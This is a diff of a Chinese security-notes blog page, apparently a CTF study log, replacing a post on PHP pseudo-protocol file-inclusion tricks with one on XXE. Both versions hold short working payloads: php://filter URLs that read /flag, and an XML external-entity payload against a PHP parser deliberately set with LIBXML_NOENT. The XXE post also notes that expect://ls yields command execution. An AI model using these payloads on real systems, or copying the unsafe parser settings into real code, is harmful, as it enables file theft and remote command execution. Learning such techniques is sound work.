@@ -19,21 +19,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="php伪协议有  php:&#x2F;&#x2F;filter php:&#x2F;&#x2F;input  可用于的场景  配合文件包含读取文件内容   filter协议p神由于包含php文件会直接执行, 而不会显示代码, 因此需要用到filter协议来读取php代码 123http:&#x2F;&#x2F;ip:port&#x2F;index.php?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.b">
+    <meta name="description" content="参考文章 xml注入参考xss注入 xpath注入参考sql注入 xxe (xml外部实体引用)有回显情况12345678910111213$xmlfile&#x3D;file_get_contents(&#x27;php:&#x2F;&#x2F;input&#x27;)$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLO">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mekrina">
-<meta property="og:url" content="http://mekrina.github.io/blogs/uncategorized/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.html">
+<meta property="og:title" content="XXE">
+<meta property="og:url" content="http://mekrina.github.io/blogs/XXE/XXE/index.html">
 <meta property="og:site_name" content="mekrina">
-<meta property="og:description" content="php伪协议有  php:&#x2F;&#x2F;filter php:&#x2F;&#x2F;input  可用于的场景  配合文件包含读取文件内容   filter协议p神由于包含php文件会直接执行, 而不会显示代码, 因此需要用到filter协议来读取php代码 123http:&#x2F;&#x2F;ip:port&#x2F;index.php?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.b">
+<meta property="og:description" content="参考文章 xml注入参考xss注入 xpath注入参考sql注入 xxe (xml外部实体引用)有回显情况12345678910111213$xmlfile&#x3D;file_get_contents(&#x27;php:&#x2F;&#x2F;input&#x27;)$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLO">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-03-08T03:51:01.244Z">
-<meta property="article:modified_time" content="2025-02-24T15:54:18.143Z">
+<meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
+<meta property="article:modified_time" content="2025-03-08T04:19:22.271Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>mekrina</title>
+  <title>XXE - mekrina</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="XXE"></span>
           
         </div>
 
@@ -210,8 +210,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-03-08 11:51" pubdate>
-          2025年3月8日 中午
+        <time datetime="2025-01-20 21:06" pubdate>
+          2025年1月20日 晚上
         </time>
       </span>
     
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          203 字
+          222 字
         
       </span>
     
@@ -270,34 +270,19 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">XXE</h1>
             
             
               <div class="markdown-body">
                 
-                <p>php伪协议有</p>
-<ol>
-<li>php:&#x2F;&#x2F;filter</li>
-<li>php:&#x2F;&#x2F;input</li>
-</ol>
-<p>可用于的场景</p>
-<ol>
-<li>配合文件包含读取文件内容</li>
-<li></li>
-</ol>
-<h2 id="filter协议"><a href="#filter协议" class="headerlink" title="filter协议"></a>filter协议</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1">p神</a><br>由于包含php文件会直接执行, 而不会显示代码, 因此需要用到filter协议来读取php代码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://ip:port/index.php?filename=<br><br>php://filter/read=convert.base64-encode/resource=/flag<br></code></pre></td></tr></table></figure>
-<p>在某些编码被过滤的时候,更通用的是</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">32771</span>/index.php?filename=<br><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">//</span>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;<span class="hljs-regexp">/resource=/</span>var<span class="hljs-regexp">/www/</span>html/flag.php<br></code></pre></td></tr></table></figure>
-<p>其中encoding可选的编码方式见php-supported-encodings</p>
-<p>必要时可以两个爆破点进行爆破</p>
-<h2 id="input协议"><a href="#input协议" class="headerlink" title="input协议"></a>input协议</h2><p>php:&#x2F;&#x2F;input用于文件包含需要开启allow_url_include: On(默认关闭)<br>如</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;php://input&quot;</span><br></code></pre></td></tr></table></figure>
-<p>通常将报错,fail to open…</p>
-<p>可以用于读取内容,需要 allow_url_fopen: On(默认开启)<br>如</p>
-<pre><code class="language-php">&lt;?php
-file_get_contents(&quot;php://input&quot;)
-</code></pre>
+                <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6887">参考文章</a></p>
+<h2 id="xml注入"><a href="#xml注入" class="headerlink" title="xml注入"></a>xml注入</h2><p>参考xss注入</p>
+<h2 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h2><p>参考sql注入</p>
+<h2 id="xxe-xml外部实体引用"><a href="#xxe-xml外部实体引用" class="headerlink" title="xxe (xml外部实体引用)"></a>xxe (xml外部实体引用)</h2><h3 id="有回显情况"><a href="#有回显情况" class="headerlink" title="有回显情况"></a>有回显情况</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$xmlfile</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>payload &#x3D; </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hack</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span> <br>        随意<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>其中<code>&amp;file;</code>用于引用访问结果<br>如果环境中装有expect扩展，把<code>php://filter/read=convert.base64-encode/resource=/flag</code>换成<br><code>expect://ls</code>可以实现任意命令执行.</p>
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>见文章</p>
 
                 
               </div>
@@ -305,6 +290,27 @@ file_get_contents(&quot;php://input&quot;)
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/blogs/categories/XXE/" class="category-chain-item">XXE</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
@@ -315,8 +321,8 @@ file_get_contents(&quot;php://input&quot;)
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
-      <div>http://mekrina.github.io/blogs/uncategorized/php伪协议/</div>
+      <div>XXE</div>
+      <div>http://mekrina.github.io/blogs/XXE/XXE/</div>
     </div>
     <div class="license-meta">
       
@@ -328,7 +334,7 @@ file_get_contents(&quot;php://input&quot;)
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年3月8日</div>
+          <div>2025年1月20日</div>
         </div>
       
       
@@ -360,9 +366,9 @@ file_get_contents(&quot;php://input&quot;)
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/uncategorized/php%E7%89%B9%E6%80%A7/" title="">
+                      <a href="/blogs/SSTI/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/" title="SSTI模版注入">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile"></span>
+                        <span class="hidden-mobile">SSTI模版注入</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -370,8 +376,8 @@ file_get_contents(&quot;php://input&quot;)
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blogs/uncategorized/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" title="">
-                        <span class="hidden-mobile"></span>
+                      <a href="/blogs/flask/flask%20debug%E6%A8%A1%E5%BC%8F/" title="flask debug模式">
+                        <span class="hidden-mobile">flask debug模式</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
